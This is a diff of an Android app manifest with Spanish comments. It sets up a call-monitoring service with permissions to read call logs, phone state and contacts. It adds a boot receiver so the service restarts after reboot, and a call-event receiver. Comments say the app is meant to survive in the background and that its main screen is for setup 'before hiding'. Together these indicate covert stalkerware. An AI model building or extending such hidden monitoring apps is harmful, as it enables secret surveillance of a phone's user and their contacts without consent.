@@ -2,21 +2,21 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
-    <!-- Permisos de ejecución en segundo plano y servicio continuo -->
+    <!-- Permisos de red e Internet -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+
+    <!-- Permisos de llamadas, historial y contactos -->
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+
+    <!-- Permisos para no morir en segundo plano y servicio continuo -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-
-    <!-- Permisos de red e Internet -->
-    <uses-permission android:name="android.permission.INTERNET" />
-    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-
-    <!-- Permisos de Telefonía, Historial y Contactos -->
-    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
-    <uses-permission android:name="android.permission.READ_CALL_LOG" />
-    <uses-permission android:name="android.permission.READ_CONTACTS" />
 
     <application
         android:allowBackup="true"
@@ -30,14 +30,35 @@
         android:usesCleartextTraffic="true"
         tools:targetApi="31">
 
-        <!-- Servicio de Monitoreo en Primer Plano -->
+        <!-- Servicio de Monitoreo en Segundo Plano -->
         <service
             android:name=".service.CallMonitoringService"
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="dataSync" />
 
-        <!-- Pantalla Principal con la ruta de paquete real -->
+        <!-- Receptor para volver a encender el servicio si reinician el celular -->
+        <receiver
+            android:name=".receiver.BootReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Receptor de eventos de llamadas entrantes/salientes -->
+        <receiver
+            android:name=".receiver.PhoneCallReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.PHONE_STATE" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Pantalla Principal (Configuración inicial antes de ocultarse) -->
         <activity
             android:name=".ui.theme.main.MainActivity"
             android:exported="true"
@@ -47,15 +68,6 @@
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
-
-        <!-- Receptor de eventos de telefonía en tiempo real -->
-        <receiver
-            android:name=".receiver.PhoneCallReceiver"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.intent.action.PHONE_STATE" />
-            </intent-filter>
-        </receiver>
 
     </application>
 
